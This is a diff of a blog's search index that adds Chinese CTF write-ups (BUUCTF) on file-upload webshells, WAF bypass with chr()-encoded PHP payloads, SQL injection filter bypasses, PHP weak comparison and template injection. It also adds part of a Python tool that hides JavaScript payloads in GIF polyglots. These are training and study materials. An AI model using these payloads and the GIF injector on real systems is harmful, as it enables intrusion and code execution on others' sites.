@@ -1,6 +1,70 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>BUUCTF刷题日志2</title>
+    <url>/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/</url>
+    <content><![CDATA[<h1 id="BUUCTF刷题日志2"><a href="#BUUCTF刷题日志2" class="headerlink" title="BUUCTF刷题日志2"></a>BUUCTF刷题日志2</h1><h2 id="第一题-极客大挑战-2019-Upload"><a href="#第一题-极客大挑战-2019-Upload" class="headerlink" title="第一题 [极客大挑战 2019]Upload"></a>第一题 [极客大挑战 2019]Upload</h2><p>一个文件上传，过滤了php3，但是除了php3我们还有phtml，上传的时候改下content-type:image/jpeg</p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117150427298.png" alt="image-20220117150427298"></p>
+<p>但是我们的马里面的&lt;?又被过滤了，所以用<code>&lt;script language=&quot;php&quot;&gt;   &lt;/script&gt; </code>来进行绕过</p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117151055301.png" alt="image-20220117151055301"></p>
+<p>添加一个gif的文件头进去，绕过这个判断</p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117151122705.png" alt="image-20220117151122705"></p>
+<p>上传成功</p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117151158231.png" alt="image-20220117151158231"></p>
+<p>猜测路径为<code>/upload/新建文本文档.phtml</code></p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117152049720.png" alt="image-20220117152049720"></p>
+<p>成功在根目录找到flag</p>
+<h2 id="第二题-文件上传"><a href="#第二题-文件上传" class="headerlink" title="第二题 文件上传"></a>第二题 文件上传</h2><p>一个前端绕过罢了，还是用phtml文件</p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117154044267.png" alt="image-20220117154044267"></p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117154204041.png" alt="image-20220117154204041"></p>
+<p>在根目录找到flag</p>
+<h2 id="第三题-php解析特性-char绕过"><a href="#第三题-php解析特性-char绕过" class="headerlink" title="第三题 php解析特性 char绕过"></a>第三题 php解析特性 char绕过</h2><p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117154748431.png" alt="image-20220117154748431"></p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117154838651.png" alt="image-20220117154838651"></p>
+<p>有前端验证</p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117155745159.png" alt="image-20220117155745159"></p>
+<p>在源码中发现了calc.php<img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117161601913.png" alt="image-20220117161601913"></p>
+<p>写不来了，看了别人的wp，</p>
+<p>然后说waf无法识别加了空格的num参数，” num”和”num”，加了空格就不是num参数了，但是php解析的时候会自动把空格去掉，然后就绕过了waf。</p>
+<p>然后使用scandir()函数，scandir(“/“)但是/被过滤了，所以用char(“47”)来代替</p>
+<p><code>? num=print_r(scandir(chr(47)));</code></p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117162229698.png" alt="image-20220117162229698"></p>
+<p>发现flag，然后就访问这个flag</p>
+<p>calc.php? <code>num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code></p>
+<h2 id="第四题-sql注入-极客大挑战-2019-BabySQL"><a href="#第四题-sql注入-极客大挑战-2019-BabySQL" class="headerlink" title="第四题 sql注入[极客大挑战 2019]BabySQL"></a>第四题 sql注入[极客大挑战 2019]BabySQL</h2><p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117170804546.png" alt="image-20220117170804546"></p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117170814134.png" alt="image-20220117170814134"></p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117171730895.png" alt="image-20220117171730895"></p>
+<p>但是可以双写绕过select和union</p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117171950628.png" alt="image-20220117171950628"></p>
+<p>爆出列数有三个</p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117172055414.png" alt="image-20220117172055414"></p>
+<p>然后又是枯燥的爆表爆字段</p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117172428770.png" alt="image-20220117172428770"></p>
+<p>人嘛了，information里面的or都被过滤了</p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117172541108.png" alt="image-20220117172541108"></p>
+<p>反正一步一步爆，然后就出来了</p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117173343401.png" alt="image-20220117173343401"></p>
+<h2 id="第五题-备份文件-代码审计-弱类型"><a href="#第五题-备份文件-代码审计-弱类型" class="headerlink" title="第五题 备份文件 代码审计 弱类型"></a>第五题 备份文件 代码审计 弱类型</h2><p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117201827743.png" alt="image-20220117201827743"></p>
+<p>发现备份文件,又是代码审计</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric(<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$key</span> = intval(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>弱比较：如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行，在比较时该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。</p>
+<p>所以我们直接传值key=123</p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117202715872.png" alt="image-20220117202715872"></p>
+<p>得到flag</p>
+<h2 id="第六题-模板注入"><a href="#第六题-模板注入" class="headerlink" title="第六题 模板注入"></a>第六题 模板注入</h2><p>经典老题目了</p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117202952675.png" alt="image-20220117202952675"></p>
+<p>flag中提示了flag的位置<code>flag in /fllllllllllllag</code></p>
+<p>welcome中提示了<code>render</code>模板渲染用的函数</p>
+<p>hints中提示了filehash的加密方法<code>md5(cookie_secret+md5(filename))</code></p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117203315129.png" alt="image-20220117203315129"></p>
+<p>然后就开始模板注入，我们的目的就是获取cookie_secret</p>
+<p>[(33条消息) BUUCTF <a href="https://blog.csdn.net/weixin_45642610/article/details/112519061">护网杯 2018]easy_tornado 1_wow小华的博客-CSDN博客</a></p>
+]]></content>
+      <categories>
+        <category>-Experience</category>
+      </categories>
+  </entry>
+  <entry>
     <title>BUUCTF 的一些签到题 内有sql 命令执行(内联)</title>
     <url>/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/</url>
     <content><![CDATA[<h1 id="BUUCTF-的一些签到题-内有sql-命令执行"><a href="#BUUCTF-的一些签到题-内有sql-命令执行" class="headerlink" title="BUUCTF 的一些签到题 内有sql 命令执行"></a>BUUCTF 的一些签到题 内有sql 命令执行</h1><h2 id="第一题-easy-sql"><a href="#第一题-easy-sql" class="headerlink" title="第一题 easy sql"></a>第一题 easy sql</h2><p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115110256458.png" alt="image-20220115110256458"></p>
@@ -122,70 +186,6 @@
 <h2 id="第十一题-菜刀"><a href="#第十一题-菜刀" class="headerlink" title="第十一题 菜刀"></a>第十一题 菜刀</h2><p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115160821181.png" alt="image-20220115160821181"></p>
 <p>蚁剑直接连</p>
 <p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115160834862.png" alt="image-20220115160834862"></p>
-]]></content>
-      <categories>
-        <category>-Experience</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>BUUCTF刷题日志2</title>
-    <url>/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/</url>
-    <content><![CDATA[<h1 id="BUUCTF刷题日志2"><a href="#BUUCTF刷题日志2" class="headerlink" title="BUUCTF刷题日志2"></a>BUUCTF刷题日志2</h1><h2 id="第一题-极客大挑战-2019-Upload"><a href="#第一题-极客大挑战-2019-Upload" class="headerlink" title="第一题 [极客大挑战 2019]Upload"></a>第一题 [极客大挑战 2019]Upload</h2><p>一个文件上传，过滤了php3，但是除了php3我们还有phtml，上传的时候改下content-type:image/jpeg</p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117150427298.png" alt="image-20220117150427298"></p>
-<p>但是我们的马里面的&lt;?又被过滤了，所以用<code>&lt;script language=&quot;php&quot;&gt;   &lt;/script&gt; </code>来进行绕过</p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117151055301.png" alt="image-20220117151055301"></p>
-<p>添加一个gif的文件头进去，绕过这个判断</p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117151122705.png" alt="image-20220117151122705"></p>
-<p>上传成功</p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117151158231.png" alt="image-20220117151158231"></p>
-<p>猜测路径为<code>/upload/新建文本文档.phtml</code></p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117152049720.png" alt="image-20220117152049720"></p>
-<p>成功在根目录找到flag</p>
-<h2 id="第二题-文件上传"><a href="#第二题-文件上传" class="headerlink" title="第二题 文件上传"></a>第二题 文件上传</h2><p>一个前端绕过罢了，还是用phtml文件</p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117154044267.png" alt="image-20220117154044267"></p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117154204041.png" alt="image-20220117154204041"></p>
-<p>在根目录找到flag</p>
-<h2 id="第三题-php解析特性-char绕过"><a href="#第三题-php解析特性-char绕过" class="headerlink" title="第三题 php解析特性 char绕过"></a>第三题 php解析特性 char绕过</h2><p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117154748431.png" alt="image-20220117154748431"></p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117154838651.png" alt="image-20220117154838651"></p>
-<p>有前端验证</p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117155745159.png" alt="image-20220117155745159"></p>
-<p>在源码中发现了calc.php<img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117161601913.png" alt="image-20220117161601913"></p>
-<p>写不来了，看了别人的wp，</p>
-<p>然后说waf无法识别加了空格的num参数，” num”和”num”，加了空格就不是num参数了，但是php解析的时候会自动把空格去掉，然后就绕过了waf。</p>
-<p>然后使用scandir()函数，scandir(“/“)但是/被过滤了，所以用char(“47”)来代替</p>
-<p><code>? num=print_r(scandir(chr(47)));</code></p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117162229698.png" alt="image-20220117162229698"></p>
-<p>发现flag，然后就访问这个flag</p>
-<p>calc.php? <code>num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code></p>
-<h2 id="第四题-sql注入-极客大挑战-2019-BabySQL"><a href="#第四题-sql注入-极客大挑战-2019-BabySQL" class="headerlink" title="第四题 sql注入[极客大挑战 2019]BabySQL"></a>第四题 sql注入[极客大挑战 2019]BabySQL</h2><p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117170804546.png" alt="image-20220117170804546"></p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117170814134.png" alt="image-20220117170814134"></p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117171730895.png" alt="image-20220117171730895"></p>
-<p>但是可以双写绕过select和union</p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117171950628.png" alt="image-20220117171950628"></p>
-<p>爆出列数有三个</p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117172055414.png" alt="image-20220117172055414"></p>
-<p>然后又是枯燥的爆表爆字段</p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117172428770.png" alt="image-20220117172428770"></p>
-<p>人嘛了，information里面的or都被过滤了</p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117172541108.png" alt="image-20220117172541108"></p>
-<p>反正一步一步爆，然后就出来了</p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117173343401.png" alt="image-20220117173343401"></p>
-<h2 id="第五题-备份文件-代码审计-弱类型"><a href="#第五题-备份文件-代码审计-弱类型" class="headerlink" title="第五题 备份文件 代码审计 弱类型"></a>第五题 备份文件 代码审计 弱类型</h2><p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117201827743.png" alt="image-20220117201827743"></p>
-<p>发现备份文件,又是代码审计</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric(<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$key</span> = intval(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>弱比较：如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行，在比较时该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。</p>
-<p>所以我们直接传值key=123</p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117202715872.png" alt="image-20220117202715872"></p>
-<p>得到flag</p>
-<h2 id="第六题-模板注入"><a href="#第六题-模板注入" class="headerlink" title="第六题 模板注入"></a>第六题 模板注入</h2><p>经典老题目了</p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117202952675.png" alt="image-20220117202952675"></p>
-<p>flag中提示了flag的位置<code>flag in /fllllllllllllag</code></p>
-<p>welcome中提示了<code>render</code>模板渲染用的函数</p>
-<p>hints中提示了filehash的加密方法<code>md5(cookie_secret+md5(filename))</code></p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117203315129.png" alt="image-20220117203315129"></p>
-<p>然后就开始模板注入，我们的目的就是获取cookie_secret</p>
-<p>[(33条消息) BUUCTF <a href="https://blog.csdn.net/weixin_45642610/article/details/112519061">护网杯 2018]easy_tornado 1_wow小华的博客-CSDN博客</a></p>
 ]]></content>
       <categories>
         <category>-Experience</category>
@@ -452,6 +452,9 @@
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment">#============================================================================================================#</span></span><br><span class="line"><span class="comment">#======= Simply injects a JavaScript Payload into a GIF. ====================================================#</span></span><br><span class="line"><span class="comment">#======= or it creates a JavaScript Payload as a GIF.    ====================================================#</span></span><br><span class="line"><span class="comment">#======= The resulting GIF must be a valid (not corrupted) GIF. =============================================#</span></span><br><span class="line"><span class="comment">#======= Author: marcoramilli.blogspot.com ==================================================================#</span></span><br><span class="line"><span class="comment">#======= Version: PoC (don&#x27;t even think to use it in development env.) ======================================#</span></span><br><span class="line"><span class="comment">#======= Disclaimer: ========================================================================================#</span></span><br><span class="line"><span class="comment">#THIS IS NOT PEP3 FORMATTED</span></span><br><span class="line"><span class="comment">#THIS SOFTWARE IS PROVIDED BY THE AUTHOR &quot;AS IS&quot; AND ANY EXPRESS OR</span></span><br><span class="line"><span class="comment">#IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED</span></span><br><span class="line"><span class="comment">#WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE</span></span><br><span class="line"><span class="comment">#DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,</span></span><br><span class="line"><span class="comment">#INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES</span></span><br><span class="line"><span class="comment">#(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR</span></span><br><span class="line">								<span class="comment">#SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)</span></span><br><span class="line">								<span class="comment">#HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,</span></span><br><span class="line"><span class="comment">#STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING</span></span><br><span class="line"><span class="comment">#IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE</span></span><br><span class="line"><span class="comment">#POSSIBILITY OF SUCH DAMAGE.</span></span><br><span class="line"><span class="comment">#===========================================================================================================#</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------------------------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_hexify</span>(<span class="params">num</span>):</span></span><br><span class="line">	<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">	Converts and formats to hexadecimal</span></span><br><span class="line"><span class="string">	&quot;&quot;&quot;</span></span><br><span class="line">	num = <span class="string">&quot;%x&quot;</span> % num</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(num) % <span class="number">2</span>:</span><br><span class="line">		num = <span class="string">&#x27;0&#x27;</span>+num</span><br><span class="line">	<span class="keyword">return</span> num.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------------------------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_generate_and_write_to_file</span>(<span class="params">payload, fname</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Generates a fake but valid GIF within scriting</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    f = <span class="built_in">open</span>(fname, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">    header = (<span class="string">b&#x27;\x47\x49\x46\x38\x39\x61&#x27;</span>  <span class="comment">#Signature + Version  GIF89a</span></span><br><span class="line">                        <span class="string">b&#x27;\x2F\x2A&#x27;</span> <span class="comment">#Encoding /* it&#x27;s a valid Logical Screen Width</span></span><br><span class="line">                        <span class="string">b&#x27;\x0A\x00&#x27;</span> <span class="comment">#Smal Logical Screen Height</span></span><br><span class="line">                        <span class="string">b&#x27;\x00&#x27;</span> <span class="comment">#GCTF</span></span><br><span class="line">                        <span class="string">b&#x27;\xFF&#x27;</span> <span class="comment">#BackgroundColor</span></span><br><span class="line">                        <span class="string">b&#x27;\x00&#x27;</span> <span class="comment">#Pixel Ratio</span></span><br><span class="line">                        <span class="string">b&#x27;\x2C\x00\x00\x00\x00\x2F\x2A\x0A\x00\x00\x02\x00\x3B&#x27;</span> <span class="comment">#GlobalColorTable + Blocks</span></span><br><span class="line">                        <span class="string">b&#x27;\x2A\x2F&#x27;</span> <span class="comment">#Commenting out */</span></span><br><span class="line">                        <span class="string">b&#x27;\x3D\x31\x3B&#x27;</span> <span class="comment"># enable the script side by introducing =1;</span></span><br><span class="line">				        )</span><br><span class="line">    trailer = <span class="string">b&#x27;\x3B&#x27;</span></span><br><span class="line">	<span class="comment"># I made this explicit, step by step .</span></span><br><span class="line">    f.write(header)</span><br><span class="line">    f.write(payload)</span><br><span class="line">    f.write(trailer)</span><br><span class="line">    f.close()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------------------------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_generate_launching_page</span>(<span class="params">f</span>):</span></span><br><span class="line">	<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">	Creates the HTML launching page</span></span><br><span class="line"><span class="string">	&quot;&quot;&quot;</span></span><br><span class="line">	htmlpage =<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">								&lt;html&gt;</span></span><br><span class="line"><span class="string">								&lt;head&gt;&lt;title&gt;Opening an image&lt;/title&gt; &lt;/head&gt;</span></span><br><span class="line"><span class="string">								&lt;body&gt;</span></span><br><span class="line"><span class="string">									&lt;img src=\&quot;&quot;&quot;&quot;</span> + f + <span class="string">&quot;&quot;&quot;_malw.gif\&quot;\&gt;</span></span><br><span class="line"><span class="string">									&lt;script src= \&quot;&quot;&quot;&quot;</span> + f + <span class="string">&quot;&quot;&quot;_malw.gif\&quot;&gt; &lt;/script&gt;</span></span><br><span class="line"><span class="string">								&lt;/body&gt;</span></span><br><span class="line"><span class="string">								&lt;/html&gt;</span></span><br><span class="line"><span class="string">			  &quot;&quot;&quot;</span></span><br><span class="line">	html = <span class="built_in">open</span>(<span class="string">&quot;run.html&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">	html.write(htmlpage);</span><br><span class="line">	html.close()</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------------------------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_inject_into_file</span>(<span class="params">payload, fname</span>):</span></span><br><span class="line">	<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">	Injects the payload into existing GIF</span></span><br><span class="line"><span class="string">	NOTE: if the GIF contains \xFF\x2A and/or \x2A\x5C might caouse issues</span></span><br><span class="line"><span class="string">	&quot;&quot;&quot;</span></span><br><span class="line">	<span class="comment"># I know, I can do it all in memory and much more fast.</span></span><br><span class="line">	<span class="comment"># I wont do it here.</span></span><br><span class="line">	<span class="keyword">with</span> <span class="built_in">open</span>(fname + <span class="string">&quot;_malw.gif&quot;</span>, <span class="string">&quot;w+b&quot;</span>) <span class="keyword">as</span> fout:</span><br><span class="line">		<span class="keyword">with</span> <span class="built_in">open</span>(fname, <span class="string">&quot;rt&quot;</span>) <span class="keyword">as</span> fin:</span><br><span class="line">			<span class="keyword">for</span> line <span class="keyword">in</span> fin:</span><br><span class="line">				ls1 = line.replace(<span class="string">b&#x27;\x2A\x2F&#x27;</span>, <span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">				ls2 = ls1.replace(<span class="string">b&#x27;\x2F\x2A&#x27;</span>, <span class="string">b&#x27;\x00\x00&#x27;</span>)				</span><br><span class="line">				fout.write(ls2)	            	</span><br><span class="line">		fout.seek(<span class="number">6</span>,<span class="number">0</span>)</span><br><span class="line">		fout.write(<span class="string">b&#x27;\x2F\x2A&#x27;</span>) <span class="comment">#/*</span></span><br><span class="line"></span><br><span class="line">	f = <span class="built_in">open</span>(fname + <span class="string">&quot;_malw.gif&quot;</span>, <span class="string">&quot;a+b&quot;</span>) <span class="comment">#appending mode</span></span><br><span class="line">	f.write(<span class="string">b&#x27;\x2A\x2F\x3D\x31\x3B&#x27;</span>)</span><br><span class="line">	f.write(payload)</span><br><span class="line">	f.write(<span class="string">b&#x27;\x3B&#x27;</span>)</span><br><span class="line">	f.close()</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------------------------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	parser = argparse.ArgumentParser()</span><br><span class="line">	parser.add_argument(<span class="string">&quot;filename&quot;</span>,<span class="built_in">help</span>=<span class="string">&quot;the gif file name to be generated/or infected&quot;</span>)</span><br><span class="line">	parser.add_argument(<span class="string">&quot;js_payload&quot;</span>,<span class="built_in">help</span>=<span class="string">&quot;the payload to be injected. For exmample: \&quot;alert(\&quot;test\&quot;);\&quot;&quot;</span>)</span><br><span class="line">	parser.add_argument(<span class="string">&quot;-i&quot;</span>, <span class="string">&quot;--inject-to-existing-gif&quot;</span>, action=<span class="string">&quot;store_true&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;inject into the current gif&quot;</span>)</span><br><span class="line">	args = parser.parse_args()</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">					|======================================================================================================|</span></span><br><span class="line"><span class="string">					| [!] legal disclaimer: usage of this tool for injecting malware to be propagated 